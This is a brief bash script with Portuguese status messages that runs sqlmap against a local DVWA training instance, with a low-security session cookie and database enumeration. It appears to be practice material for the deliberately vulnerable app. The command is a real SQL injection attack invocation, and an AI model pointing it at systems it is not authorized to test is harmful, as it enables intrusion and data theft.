#!/bin/bash
echo "[*] Iniciando análise SQL Injection com sqlmap..."
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=test" --batch --level=3 --risk=2 --dbs
echo "[✓] Análise SQLi concluída."
